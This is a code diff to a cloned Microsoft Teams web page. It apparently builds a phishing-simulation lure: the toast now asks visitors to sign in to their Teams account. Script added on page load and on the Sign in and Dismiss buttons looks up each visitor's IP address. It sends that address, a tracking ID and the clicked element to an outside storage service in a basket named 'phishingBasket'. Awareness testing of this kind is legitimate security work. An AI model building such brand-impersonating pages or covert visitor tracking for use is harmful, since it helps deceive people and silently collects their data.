@@ -2662,7 +2662,7 @@ User Overrides
   <link rel="preconnect" href="https://res-1.cdn.office.net/">
 </head>
 
-<body emit-window-events="" ngsf-fullscreen="fullscreenCtrl"
+<body onload="logLoad()" emit-window-events="" ngsf-fullscreen="fullscreenCtrl"
   class="exp-density-view hide-messages power-bar-visible hybrid-layout-enabled initialized loadingscreendone" ng-class="{
 'theme-transition': app.layoutService.themeTransition,
 'fullscreen-layout': !app.layoutService.isRigel &amp;&amp; app.layoutService.fullscreenEnabled,
@@ -2717,16 +2717,98 @@ User Overrides
         </div>
 
         <!-- START Custom Exploit -->
+        <script src=
+          "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+        </script>
         <script>
-          function customFunction() {
-            alert("Some javascript action.")
+          function logLoad() {
+            // alert("page loaded.");
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+                let ident = urlParams.get('ident')
+
+                var myHeaders = new Headers();
+                myHeaders.append("Content-Type", "application/json");
+
+                var raw = JSON.stringify({
+                  "accesses": [
+                    {
+                      "datetime": parseInt(Date.now() / 1000),
+                      "ip": data.ip,
+                      "id": ident
+                    }
+                  ]
+                });
+
+                var requestOptions = {
+                  method: 'PUT',
+                  headers: myHeaders,
+                  body: raw,
+                  redirect: 'follow'
+                };
+
+                fetch("https://getpantry.cloud/apiv1/pantry/9ff0dd05-48b4-4847-afd4-55f995c1796e/basket/phishingBasket", requestOptions)
+                  .then(response => response.text())
+                  .then(result => console.log(result))
+                  .catch(error => console.log('error', error));
+
+            });
+
           }
+
+          function logInteraction(elementName) {
+            // alert("page loaded.");
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+                let ident = urlParams.get('ident')
+
+                var myHeaders = new Headers();
+                myHeaders.append("Content-Type", "application/json");
+
+                var raw = JSON.stringify({
+                  "interactions": [
+                    {
+                      "datetime": parseInt(Date.now() / 1000),
+                      "ip": data.ip,
+                      "id": ident,
+                      "element": elementName
+                    }
+                  ]
+                });
+
+                var requestOptions = {
+                  method: 'PUT',
+                  headers: myHeaders,
+                  body: raw,
+                  redirect: 'follow'
+                };
+
+                fetch("https://getpantry.cloud/apiv1/pantry/9ff0dd05-48b4-4847-afd4-55f995c1796e/basket/phishingBasket", requestOptions)
+                  .then(response => response.text())
+                  .then(result => console.log(result))
+                  .catch(error => console.log('error', error));
+
+                alert(`You've been phished! Your phishing ID is ${ident}. Your IP address is ${data.ip}. You clicked the ${elementName} button at ${parseInt(Date.now() / 1000)}. This action has been logged.`);
+
+            });
+
+          }
+
+          // function customFunction() {
+          //   alert("Some javascript action.")
+          // }
         </script>
 
         <div class="toast-message ">      
           <p ng-if="!message.isSkypeConsumerCall"
             ng-class="{ 'app-max-2-lines-base': message.toastType != 'DesktopNotification', 'max-3-lines': message.toastType == 'DesktopNotification' }"
-            class="title max-3-lines">Here's where we can write a hook. </p>
+            class="title max-3-lines">Please sign in to your Team account.</p>
           
           
           <p ng-if="!message.isSpamCall" class="app-max-2-lines-base subtitle"></p>
@@ -2735,18 +2817,18 @@ User Overrides
           
           <div class="actions" ng-if="!!message.actions">
             <button ng-repeat="action in message.actions" type="button" role="button" class="action-button "
-              title="Turn on" aria-label="Turn on" data-tid="" onclick="customFunction()">
+              title="Log in" aria-label="Sign in" data-tid="" onclick="logInteraction('Sign in')">
               
               
               <div ng-if="message.toastType == 'meetup' || message.toastType == 'DesktopNotification'" class="text"
-                translate-once="Turn on">Turn on</div>
+                translate-once="Turn on">Sign in</div>
             </button><button ng-repeat="action in message.actions" type="button" role="button"
               class="action-button " title="Dismiss" aria-label="Dismiss" data-tid=""
               ng-click="action.action(); $event.stopPropagation();">
               
               
               <div ng-if="message.toastType == 'meetup' || message.toastType == 'DesktopNotification'" class="text"
-                translate-once="Dismiss">Dismiss</div>
+                translate-once="Dismiss" onclick="logInteraction('Dismiss')">Dismiss</div>
             </button>
           </div>
 
